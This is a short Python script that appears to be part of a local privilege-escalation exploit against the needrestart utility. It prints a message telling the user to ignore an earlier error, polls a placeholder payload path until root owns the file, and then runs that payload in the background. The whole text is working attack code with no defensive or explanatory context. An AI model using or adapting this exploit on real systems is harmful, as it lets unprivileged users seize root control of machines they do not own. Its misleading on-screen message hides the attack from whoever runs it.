import os
import time
import pwd
print("#########################\n\nDont mind the error message above\n\nWaiting for needrestart to run...")
while True:
    try:
        file_stat = os.stat('PAYLOAD_PATH')
    except FileNotFoundError:
        exit()
    username = pwd.getpwuid(file_stat.st_uid).pw_name
    if (username == 'root'):
        os.system('PAYLOAD_PATH &')
        exit()
    time.sleep(1)